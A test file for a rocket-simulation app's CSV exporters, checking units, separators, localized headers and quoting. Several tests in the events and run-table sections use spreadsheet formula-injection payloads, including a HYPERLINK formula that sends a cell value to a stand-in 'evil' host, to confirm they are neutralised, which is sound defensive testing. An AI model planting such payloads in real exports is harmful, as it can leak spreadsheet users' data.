import { describe, it, expect } from 'vitest';
import { flightDataCsv, aeroTableCsv, flightEventsCsv, runTableCsv } from '../../../src/services/exports/csvExport';
import { METRIC_UNITS, IMPERIAL_UNITS, UNITS } from '../../../src/prefs/units';
import type { FlightResult, AeroSweep } from '../../../src/engine/openRocketEngine';
import en from '../../../src/i18n/locales/en.json';
import de from '../../../src/i18n/locales/de.json';
import { localeTranslator } from '../../testing/localeTranslator';

/** A locale's `t`, with i18next's `context` variants (`_rail`, `_rod`). */
const tFor = (bundle: unknown) => {
  const base = localeTranslator(bundle);
  return (key: string, vars?: Record<string, unknown>): string => {
    const ctx = vars?.['context'];
    if (typeof ctx === 'string') {
      const own = base(`${key}_${ctx}`, vars);
      if (own !== `${key}_${ctx}`) return own;
    }
    return base(key, vars);
  };
};
const tEn = tFor(en);

const result = {
  series: {
    time: [0, 1],
    altitude: [0, 100],
    velocity: [0, 50],
    acceleration: [10, 20],
    mass: [0.05, 0.04], // kg → g ×1000
    thrust: [6, 0],
    drag: [0, 1],
    mach: [0, 0.3],
    stability: [1.5, 2.0],
    cpLocation: [0.223, 0.225], // m → cm ×100
    cgLocation: [0.2, 0.21], // m → cm ×100
    aoa: [0, Math.PI / 180], // rad → deg
  },
  events: [
    { type: 'BURNOUT', time: 1.0 },
    { type: 'APOGEE', time: 5.234 },
  ],
} as unknown as FlightResult;

/** Names the way the dialog does, so headers read as a person would write them. */
const named = (c: { key: string }) =>
  (
    ({
      time: 'Time',
      altitude: 'Altitude',
      velocity: 'Velocity',
      mass: 'Mass',
      Px: 'East',
      Py: 'North',
    }) as Record<string, string>
  )[c.key] ?? c.key;

const opts = { columnName: named };

describe('flightDataCsv', () => {
  it('uses CRLF line endings and a trailing newline', () => {
    const csv = flightDataCsv(result, METRIC_UNITS, opts);
    expect(csv.includes('\r\n')).toBe(true);
    expect(csv.endsWith('\r\n')).toBe(true);
  });

  it('writes only the columns asked for, in column order', () => {
    // Not the order they were listed in: a file whose columns shuffle depending
    // on how the boxes were ticked is a file nobody can script against.
    const csv = flightDataCsv(result, METRIC_UNITS, {
      ...opts,
      columns: ['velocity', 'time'],
      fieldDescriptions: true,
      simDescription: false,
      flightEvents: false,
    });
    expect(csv.split('\r\n')[0]).toBe('# Time (s),Velocity (m/s)');
  });

  it('applies the chosen unit to every column', () => {
    const csv = flightDataCsv(result, METRIC_UNITS, {
      ...opts,
      columns: ['time', 'altitude', 'mass'],
      fieldDescriptions: true,
      simDescription: false,
      flightEvents: false,
      decimals: 1,
    });
    const rows = csv.split('\r\n');
    expect(rows[0]).toBe('# Time (s),Altitude (m),Mass (g)');
    // kg -> g, so 0.05 reads as 50.
    expect(rows[1]).toBe('0.0,0.0,50.0');
  });

  it('honors the decimal places and exponential notation', () => {
    const body = (o: object) =>
      flightDataCsv(result, METRIC_UNITS, {
        ...opts,
        columns: ['altitude'],
        fieldDescriptions: true,
        simDescription: false,
        flightEvents: false,
        ...o,
      }).split('\r\n')[2];
    expect(body({ decimals: 1 })).toBe('100.0');
    expect(body({ decimals: 4 })).toBe('100.0000');
    expect(body({ decimals: 2, exponential: true })).toBe('1.00e+2');
  });

  it('writes the separator it was given', () => {
    const csv = flightDataCsv(result, METRIC_UNITS, {
      ...opts,
      columns: ['time', 'altitude'],
      separator: '\t',
      fieldDescriptions: true,
      simDescription: false,
      flightEvents: false,
    });
    expect(csv.split('\r\n')[0]).toBe('# Time (s)	Altitude (m)');
  });

  it('comments the simulation, the fields and the events, each on request', () => {
    const csv = flightDataCsv(result, METRIC_UNITS, { ...opts, columns: ['time'] }, 'Kept');
    const comments = csv.split('\r\n').filter((l) => l.startsWith('#'));
    expect(comments).toContain('# Simulation: Kept');
    expect(comments).toContain('# Time (s)');
    expect(comments).toContain('# Event BURNOUT occurred at t=1 seconds');
  });

  it('lays the file out as desktop does: one commented header, events among the rows at their time', () => {
    const csv = flightDataCsv(result, METRIC_UNITS, { ...opts, columns: ['time', 'altitude'] }, 'Kept');
    expect(csv.split('\r\n')).toEqual([
      '# Simulation: Kept',
      '# 2 data points written for 2 variables.',
      '#',
      '# Time (s),Altitude (m)',
      '0.000,0.000',
      '# Event BURNOUT occurred at t=1 seconds',
      '1.000,100.000',
      '# Event APOGEE occurred at t=5.234 seconds',
      '',
    ]);
  });

  it('writes no header row when field descriptions are off', () => {
    const csv = flightDataCsv(result, METRIC_UNITS, {
      ...opts,
      columns: ['time'],
      simDescription: false,
      fieldDescriptions: false,
      flightEvents: false,
    });
    expect(csv).toBe('0.000\r\n1.000\r\n');
  });

  it('writes no comments at all when none were asked for', () => {
    const csv = flightDataCsv(result, METRIC_UNITS, {
      ...opts,
      columns: ['time'],
      simDescription: false,
      fieldDescriptions: false,
      flightEvents: false,
    });
    expect(csv.split('\r\n').some((l) => l.startsWith('#'))).toBe(false);
  });

  it('uses the comment character it was given', () => {
    const csv = flightDataCsv(
      result,
      METRIC_UNITS,
      {
        ...opts,
        columns: ['time'],
        commentChar: '//',
        fieldDescriptions: false,
        flightEvents: false,
      },
      'Kept',
    );
    expect(csv.startsWith('// Simulation: Kept')).toBe(true);
  });

  it('renders a null or non-finite sample as an empty cell', () => {
    // Blank, not zero: a gap in the series is not a measurement of nothing.
    const r = {
      series: { time: [0, 1], altitude: [null, NaN] },
      events: [],
    } as unknown as FlightResult;
    const csv = flightDataCsv(r, METRIC_UNITS, {
      ...opts,
      columns: ['time', 'altitude'],
      simDescription: false,
      fieldDescriptions: true,
      flightEvents: false,
    });
    expect(csv.split('\r\n')[1]).toBe('0.000,');
  });

  it('offers the horizontal track, in the distance unit', () => {
    // Without these columns the file carries altitude and nothing horizontal,
    // which makes a landing point unanswerable from the CSV.
    const drifted = { ...result, series: { ...result.series, Px: [0, 30], Py: [0, -40] } } as unknown as FlightResult;
    const csv = flightDataCsv(drifted, IMPERIAL_UNITS, {
      ...opts,
      columns: ['Px', 'Py'],
      decimals: 2,
      simDescription: false,
      fieldDescriptions: true,
      flightEvents: false,
    });
    const rows = csv.split('\r\n');
    expect(rows[0]).toBe('# East (ft),North (ft)');
    expect(rows[2]).toBe('98.43,-131.23');
  });

  it('writes air temperature as a reading, with the unit offset applied', () => {
    // 288.15 K is 15 °C and 59 °F (C = K - 273.15, F = C * 9/5 + 32). A column
    // multiplier alone would write 288.15 and 518.67.
    const r = { series: { time: [0], T: [288.15] }, events: [] } as unknown as FlightResult;
    const write = (units: typeof METRIC_UNITS) =>
      flightDataCsv(r, units, {
        ...opts,
        columns: ['time', 'T'],
        decimals: 2,
        simDescription: false,
        fieldDescriptions: true,
        flightEvents: false,
      }).split('\r\n');
    const metric = write(METRIC_UNITS);
    expect(metric[0]).toBe('# Time (s),T (°C)');
    expect(metric[1]).toBe('0.00,15.00');
    const imperial = write(IMPERIAL_UNITS);
    expect(imperial[0]).toBe('# Time (s),T (°F)');
    expect(imperial[1]).toBe('0.00,59.00');
  });
});

const sweep = {
  machs: [0.5],
  powerOff: { total: [0.5], friction: [0.1], pressure: [0.2], base: [0.2] },
  powerOn: { total: [0.6] },
  cp: [0.223],
  cna: [2.0],
  hasNozzle: true,
  components: [{ name: 'Nose[1],x', cd: [0.05] }],
} as unknown as AeroSweep;

describe('aeroTableCsv', () => {
  it('includes the Cd_powerOn column and sanitizes component header names', () => {
    const lines = aeroTableCsv(sweep, METRIC_UNITS).split('\r\n');
    // Brackets stripped; the comma is kept and the field quoted, so it stays one column.
    expect(lines[0]).toBe('Mach,Cd,Cd_friction,Cd_pressure,Cd_base,Cd_powerOn,CP (cm),CNalpha (/rad),"Cd_Nose1,x"');
    expect(fields(lines[0]!)).toHaveLength(9);
    expect(lines[1]).toBe('0.500,0.5,0.1,0.2,0.2,0.6,22.3,2,0.05');
  });

  it('omits the Cd_powerOn column when there is no nozzle', () => {
    const noNozzle = { ...sweep, hasNozzle: false } as unknown as AeroSweep;
    const header = aeroTableCsv(noNozzle, METRIC_UNITS).split('\r\n')[0];
    expect(header!.includes('Cd_powerOn')).toBe(false);
  });

  it('converts the CP column and names the unit it used', () => {
    const lines = aeroTableCsv(sweep, IMPERIAL_UNITS).split('\r\n');
    expect(lines[0]!.includes('CP (in)')).toBe(true);
    // 0.223 m = 8.779527559... in
    expect(lines[1]!.split(',')[6]).toBe('8.779528');
  });
});

/**
 * The events export. Where `flightDataCsv` can carry events as comment lines
 * for a reader, this answers the other question: give me the events as data.
 */
/** Split one CSV line into fields, respecting quotes, as a reader does. */
function fields(line: string): string[] {
  const out: string[] = [];
  let cur = '';
  let quoted = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i]!;
    if (quoted) {
      if (c !== '"') cur += c;
      else if (line[i + 1] === '"') {
        cur += '"';
        i++;
      } else quoted = false;
    } else if (c === '"') quoted = true;
    else if (c === ',') {
      out.push(cur);
      cur = '';
    } else cur += c;
  }
  out.push(cur);
  return out;
}

describe('flightEventsCsv', () => {
  const rows = [
    {
      key: '0:LAUNCHROD:0.3:0',
      type: 'LAUNCHROD',
      time: 0.3,
      branch: 0,
      branchName: 'Sustainer',
      altitude: 1.5,
      velocity: 20,
      stability: 1.8,
      twr: 12,
      aoa: Math.PI / 180, // rad → deg
      mach: 0.06,
      q: null,
    },
    {
      key: '1:GROUND_HIT:40:1',
      type: 'GROUND_HIT',
      time: 40,
      branch: 1,
      branchName: '',
      source: 'Main',
      altitude: 0,
      velocity: 4.5,
      stability: null,
      twr: null,
      aoa: null,
      mach: null,
      q: null,
    },
  ];
  const name = (r: { type: string }) => (r.type === 'LAUNCHROD' ? 'Rail departure' : 'Landing');
  const stage = (r: { branchName: string; branch: number }) => r.branchName || `Stage ${r.branch + 1}`;
  const csv = () => flightEventsCsv(rows, METRIC_UNITS, tEn, name, stage, 'C6 flight');

  it('writes every extra as its own column, blank where an event has none', () => {
    const lines = csv().trim().split('\r\n');
    expect(lines[0]).toBe('# Simulation: C6 flight');
    expect(lines[1]).toBe(
      'Time (s),Event,Source,Stage,Altitude (m),Velocity (m/s),Stability (cal),Thrust/weight,Angle of attack (°),Mach,Dynamic pressure (hPa)',
    );
    expect(lines[2]).toBe('0.300,"Rail departure",,"Sustainer",1.5,20,1.8,12,1,0.06,');
    // Landing has no stability, TWR, AoA, Mach or q - those cells are empty
    // rather than zero, because it does not have them rather than having 0.
    expect(lines[3]).toBe('40.000,"Landing","Main","Stage 2",0,4.5,,,,,');
  });

  it('converts to the given units, so an imperial file reads in feet', () => {
    const lines = flightEventsCsv(rows, IMPERIAL_UNITS, tEn, name, stage).trim().split('\r\n');
    expect(lines[0]).toContain('Altitude (ft)');
    expect(lines[1]!.split(',')[4]).toBe(String(Math.round((1.5 / 0.3048) * 1e6) / 1e6));
  });

  it('omits the title comment when there is no simulation name', () => {
    expect(flightEventsCsv(rows, METRIC_UNITS, tEn, name, stage).startsWith('Time (s),')).toBe(true);
  });

  it('writes its title and headers in the language of its cells', () => {
    const [title, head] = flightEventsCsv(rows, METRIC_UNITS, tFor(de), name, stage, 'C6').split('\r\n');
    expect(title).toBe(`# ${de.csv.head.simulationLine.replace('{{name}}', 'C6')}`);
    expect(head!.startsWith(`${de.csv.head.time} (s),${de.csv.head.event},${de.csv.head.source},`)).toBe(true);
    expect(head).not.toMatch(/Event|Altitude|Velocity/);
    // The caliber unit is a word, and German abbreviates it differently.
    expect(head).toContain(`${de.csv.head.stability} (${de.stability.caliber})`);
    expect(head).not.toContain('(cal)');
  });

  it('keeps a file-sourced simulation name in one cell of the title line', () => {
    const csvText = flightEventsCsv(rows, METRIC_UNITS, tEn, name, stage, 'x,=HYPERLINK("http://evil/?"&A1);=1\t=2');
    const title = csvText.split('\r\n')[0]!;
    expect(title).not.toMatch(/[,;\t]/);
    expect(fields(title)).toHaveLength(1);
  });

  it('quotes a name carrying a comma, so it cannot split the row', () => {
    const csvText = flightEventsCsv(
      [{ ...rows[0]!, branchName: 'Booster, lower' }],
      METRIC_UNITS,
      tEn,
      name,
      (r) => r.branchName,
    );
    const body = csvText.trim().split('\r\n')[1]!;
    expect(body).toContain('"Booster, lower"');
    // Eleven columns still, not twelve: the comma inside the quotes is data.
    expect(fields(body).length).toBe(11);
    expect(fields(body)[3]).toBe('Booster, lower');
  });

  /**
   * Spreadsheet formula injection. Every name column here is file-sourced:
   * `source` is the kernel's component name, straight out of an imported
   * `.ork`, and `stage` falls back to the branch name. Excel and Sheets strip
   * the RFC-4180 quoting before evaluating, so quoting alone does not stop a
   * crafted name executing when the export is opened.
   */
  it('neutralizes a formula-triggering name rather than only quoting it', () => {
    const csvText = flightEventsCsv(
      [{ ...rows[0]!, source: '=HYPERLINK("http://evil/?"&A1,"Open")', branchName: '+1+1' }],
      METRIC_UNITS,
      tEn,
      name,
      (r) => r.branchName,
    );
    const body = csvText.trim().split('\r\n')[1]!;
    // The apostrophe is inside the quoting, so the cell reads as text.
    expect(fields(body)[2]).toBe('\'=HYPERLINK("http://evil/?"&A1,"Open")');
    expect(fields(body)[3]).toBe("'+1+1");
    // Still the same column count: the prefix is not a new field.
    expect(fields(body).length).toBe(11);
  });

  it('prefixes every trigger character, including a leading minus', () => {
    for (const bad of ['=cmd', '+1', '-1+1', '@SUM(A1)', '\tlead']) {
      const csvText = flightEventsCsv([{ ...rows[0]!, branchName: bad }], METRIC_UNITS, tEn, name, (r) => r.branchName);
      const cell = fields(csvText.trim().split('\r\n')[1]!)[3];
      expect(cell, bad).toBe(`'${bad}`);
    }
  });

  it('leaves an ordinary name untouched, prefix and all', () => {
    const csvText = flightEventsCsv(
      [{ ...rows[0]!, branchName: 'Booster' }],
      METRIC_UNITS,
      tEn,
      name,
      (r) => r.branchName,
    );
    expect(fields(csvText.trim().split('\r\n')[1]!)[3]).toBe('Booster');
  });
});

describe('runTableCsv', () => {
  const flown = {
    summary: {
      maxAltitude: 304.8,
      maxVelocity: 100,
      maxAcceleration: 50,
      maxMachNumber: 0.29,
      timeToApogee: 7.5,
      flightTime: 40,
      groundHitVelocity: 5,
      launchRodVelocity: 15,
      deploymentVelocity: 8,
      optimumDelay: 5,
    },
    events: [{ type: 'APOGEE', time: 7.5 }],
    series: { time: [0, 1], altitude: [0, 10], velocity: [0, 10], mach: [0, 0.1], aoa: [0, 0], dΦ: [0, -6.283185307] },
  } as unknown as FlightResult;

  it('writes one row per simulation, in the chosen units, headers naming them', () => {
    const csv = runTableCsv(
      [
        { name: 'C6', configuration: 'Estes C6-5', motors: 'Estes C6-5', status: 'Up to date', result: flown },
        { name: 'Never flown', configuration: 'D12', motors: 'Estes D12-5', status: 'Not run' },
      ],
      IMPERIAL_UNITS,
      tEn,
    );
    const [head, a, b] = csv.trimEnd().split('\r\n');
    expect(head).toContain('Apogee (ft)');
    expect(head).toContain('Max roll rate (r/s)');
    const cells = a!.split(',');
    expect(cells.slice(0, 4)).toEqual(['"C6"', '"Estes C6-5"', '"Estes C6-5"', '"Up to date"']);
    expect(Number(cells[4])).toBeCloseTo(1000, 6);
    // One turn a second, by magnitude.
    expect(Number(cells[cells.length - 1])).toBeCloseTo(1, 6);
    // A simulation that never flew is still listed, with no figures.
    expect(b!.startsWith('"Never flown","D12","Estes D12-5","Not run",')).toBe(true);
    expect(
      b!
        .split(',')
        .slice(4)
        .every((c) => c === ''),
    ).toBe(true);
  });

  it('keeps a name from becoming a spreadsheet formula', () => {
    const csv = runTableCsv(
      [{ name: '=HYPERLINK("x")', configuration: '', motors: '', status: '' }],
      METRIC_UNITS,
      tEn,
    );
    expect(csv.split('\r\n')[1]!.startsWith('"\'=HYPERLINK(""x"")"')).toBe(true);
  });

  it('writes its headers in the language of its cells', () => {
    const head = runTableCsv([], METRIC_UNITS, tFor(de), 'rail').split('\r\n')[0]!;
    expect(head.startsWith(`${de.csv.head.simulation},${de.csv.head.configuration},`)).toBe(true);
    expect(head).toContain(`${de.csv.head.exitVelocity_rail} (m/s)`);
    expect(head).not.toMatch(/Apogee|Max velocity|Configuration/);
  });

  /**
   * q·α is Pa·rad in SI, the product of the pressure and angle quantities, so
   * the column reads in the user's pressure unit times their angle unit, as
   * every other column follows the user's units.
   */
  it('writes max q·α in the pressure unit times the angle unit, for every pair', () => {
    const gusty = {
      ...flown,
      series: {
        ...flown.series,
        time: [0, 1, 2],
        ρ: [1.2, 1.2, 1.2],
        Vs: [340, 340, 340],
        mach: [0, 0.5, 0],
        aoa: [0, 0.1, 0],
      },
      events: [{ type: 'APOGEE', time: 7.5 }],
    } as unknown as FlightResult;
    // q = 1/2 * 1.2 * 170^2 = 17,340 Pa, times 0.1 rad: 1,734 Pa·rad.
    const paRad = 0.5 * 1.2 * 170 * 170 * 0.1;
    for (const p of UNITS.pressure) {
      for (const a of UNITS.angle) {
        const units = { ...METRIC_UNITS, pressure: p.symbol, angle: a.symbol };
        const [head, line] = runTableCsv(
          [{ name: 'G', configuration: '', motors: '', status: '', result: gusty }],
          units,
          tEn,
        )
          .trimEnd()
          .split('\r\n');
        const heads = head!.split(',');
        const i = heads.indexOf(`${en.csv.head.maxQAlpha} (${p.symbol}·${a.symbol})`);
        expect(i, `${p.symbol}·${a.symbol}`).toBeGreaterThan(0);
        expect(Number(line!.split(',')[i])).toBeCloseTo(paRad / p.toSI / a.toSI, 4);
      }
    }
  });

  it("names the exit column after the design's launcher", () => {
    const head = (k: 'rail' | 'rod' | null) => runTableCsv([], METRIC_UNITS, tEn, k).split('\r\n')[0]!;
    expect(head('rail')).toContain('Rail exit velocity (m/s)');
    expect(head('rod')).toContain('Rod exit velocity (m/s)');
    expect(head(null)).toContain('Launcher exit velocity (m/s)');
  });
});
